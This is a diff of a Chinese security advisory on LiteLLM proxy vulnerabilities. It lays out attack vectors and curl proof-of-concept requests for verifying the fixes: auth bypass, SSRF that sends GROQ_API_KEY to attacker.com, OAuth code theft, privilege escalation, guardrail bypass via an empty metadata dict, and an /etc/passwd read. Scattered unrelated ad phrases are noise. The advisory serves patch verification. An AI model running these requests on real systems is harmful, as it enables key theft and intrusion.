@@ -29,6 +29,14 @@ asset_dir: embedded-base64
 
 ## 二、高危漏洞分析（7 个）
 
+深入探索
+
+选购系统优化软件
+
+订阅时事资讯
+
+报名新闻课
+
 ### 2.1 PR #26463 — MCP 公共路由检测绕过 + OAuth2 Fallback
 
 **[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")类型**: 认证绕过 (CWE-290)  
@@ -43,15 +51,7 @@ asset_dir: embedded-base64
 
 **攻击向量**: 在 URL 的 query string 中注入 `.well-known` 子字符串（如 `?redirect=.well-known`），使请求被误判为公开路由，跳过认证。
 
-咨询网络安全
-
-深入探索
-
-vpn
-
-Blog
-
-选购博客模板
+报名数学课程
 
 **OAuth2 Fallback**:
 
@@ -69,6 +69,14 @@ Blog
 **[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")类型**: SSRF (CWE-918) / 凭证窃取  
 **修复文件**: `litellm/litellm_core_utils/get_llm_provider_logic.py`, `litellm/proxy/auth/auth_utils.py`
 
+深入探索
+
+博客
+
+Blog
+
+选购博客模板
+
 **代码差异**:
 
 ```
@@ -79,23 +87,15 @@ Blog
 修复后: response = safe_get(sync_handler, api_base)  (SSRF 防护)
 ```
 
-**攻击向量**: `api_base=https://attacker.com/api.groq.com/openai/v1` 冒充 Groq 端点，[代理](#)读取 GROQ\_API\_KEY 并发送到攻击者服务器。
+**攻击向量**: `api_base=https://attacker.com/api.groq.com/openai/v1` 冒充 Groq 端点，代理读取 GROQ\_API\_KEY 并发送到攻击者服务器。
 
-学习网络安全
+订阅电子报
 
 **额外加固**: 新增 9 个 banned params（langsmith\_base\_url, langfuse\_host, posthog\_host 等）
 
 ---
 
 ### 2.3 PR #26854 — Team 权限提升
-
-深入探索
-
-博客
-
-学习脚本语言
-
-网络安全
 
 **漏洞类型**: 授权绕过 / 权限提升 (CWE-269)  
 **修复文件**: `litellm/proxy/management_endpoints/team_endpoints.py`
@@ -112,7 +112,7 @@ Blog
 
 **攻击向量**: 任意已认证用户向 available-team 发送 `POST /team/member_add`，以 admin 角色将自己添加为成员。
 
-学习编程课程
+查阅在线词典
 
 ---
 
@@ -132,6 +132,8 @@ Blog
 ```
 
 **攻击向量**: 发送 `{"metadata": {"guardrails": {}}}` 绕过 guardrail 修改权限，下游将空 dict 解读为"禁用所有 guardrails"。
+
+咨询网络安全
 
 ---
 
@@ -169,7 +171,7 @@ Blog
 
 **攻击向量**: 构造恶意 OAuth state，将 client\_redirect\_uri 设为 `https://attacker.com/cb`，callback 将 authorization code 重定向到攻击者域名。
 
-咨询网络安全
+学习网络安全
 
 ---
 
@@ -250,7 +252,7 @@ Blog
 
 按 GHSA 分析器验证框架，对每个 PR 的分析结论逐项与实际 diff 对照。
 
-学习网络安全
+学习编程课程
 
 ### 审核结论
 
@@ -294,7 +296,7 @@ Content-Type: application/json
 
 **判断依据**: 200 + 包含 tools 数组 = 绕过成功；401/403 = 已修复
 
-报名数学课程
+评估网络安全
 
 #### PoC #26463-B: OAuth2 Fallback 无条件执行
 
@@ -340,6 +342,8 @@ Authorization: Bearer sk-your-litellm-key
 
 **判断依据**: 在 attacker.com 日志中观察到 Authorization header 包含 GROQ\_API\_KEY = 泄露成功
 
+查阅在线词典
+
 #### PoC #26484: Master Key 泄露到 /metrics
 
 ```
@@ -369,6 +373,8 @@ Host: target:4000
 
 **判断依据**: 200 + 响应包含 API key = 劫持成功；需要 poll\_secret = 已修复
 
+咨询网络安全
+
 ---
 
 ### 6.2 授权绕过 PoC
@@ -396,6 +402,8 @@ Authorization: Bearer sk-regular-user-key
 
 **判断依据**: 200 + 成员角色为 admin = 提权成功；403 = 已修复
 
+学习网络安全
+
 #### PoC #26831: Batch 身份冒用
 
 ```
@@ -406,6 +414,8 @@ curl -v -X POST http://target:4000/v1/passthrough/anthropic/v1/messages/batches 
 ```
 
 **判断依据**: spend 记录 user\_id="default-user" = 身份冒用；user\_id=实际用户 = 已修复
+
+报名数学课程
 
 #### PoC #26821: Guardrail 绕过 via 空值
 
@@ -430,6 +440,8 @@ Authorization: Bearer sk-regular-user-key
 ```
 
 **判断依据**: 200 + 无 guardrail 拦截 = 绕过成功；403 guardrail violation = 已修复
+
+评估网络安全
 
 #### PoC #26827: Passthrough 默认无认证
 
@@ -463,6 +475,8 @@ curl -v "http://target:4000/mcp/oauth/callback?code=stolen-auth-code&state=malic
 
 **判断依据**: 302 重定向到 attacker.com/cb?code=... = code 窃取成功；400 invalid redirect = 已修复
 
+查阅在线词典
+
 #### PoC #26849: SSRF via OAuth Metadata Discovery
 
 ```
@@ -495,6 +509,8 @@ curl -v "http://target:4000/get_logo_url"
 
 **判断依据**: 响应包含本地路径（如 `/opt/litellm/config/secret.key`）= 泄露成功；空字符串 = 已修复
 
+咨询网络安全
+
 #### PoC #26862-A: Response Header Injection
 
 ```
@@ -512,8 +528,6 @@ curl -v -X POST http://target:4000/chat/completions \
 
 **判断依据**: 响应头包含 `x-injected-evil` = 注入成功；header 被过滤 = 已修复
 
-学习编程课程
-
 #### PoC #26862-B: Audit Log Spoofing
 
 ```
@@ -525,6 +539,8 @@ curl -v -X POST http://target:4000/key/generate \
 ```
 
 **判断依据**: 审计日志 changed\_by="fake-admin-identity" = 伪造成功；changed\_by=实际用户 = 已修复
+
+学习编程课程
 
 ---
 
@@ -556,6 +572,8 @@ curl -v -X POST http://target:4000/v1/audio/transcriptions \
 ```
 
 **判断依据**: 响应包含 /etc/passwd 内容 = 任意文件读取成功；400 invalid input = 已修复
+
+查阅在线词典
 
 #### PoC #27539: 预算耗尽 DoS
 
@@ -648,7 +666,7 @@ curl -v -X POST "http://target:4000/v1/chat/completions" \
 
 **判断依据**: 错误响应包含 prompt\_variables 及其值 = 泄露；仅包含 Prompt id = 已修复
 
-评估网络安全
+咨询网络安全
 
 #### PoC #26489: 向量存储凭据泄露
 
@@ -741,7 +759,7 @@ pip install litellm>=1.84.3
 ### 临时缓解
 
 1. **WAF 规则**: 阻止 `.well-known` 出现在 query string 中
-2. **反向[代理](#)**: 在 proxy 层过滤 Host header
+2. **反向代理**: 在 proxy 层过滤 Host header
 3. **网络隔离**: 限制 LiteLLM 实例对内网 metadata endpoint 的访问
 4. **日志监控**: 监控 /metrics 端点访问和异常错误消息
 5. **最小权限**: 限制 API key 的权限范围
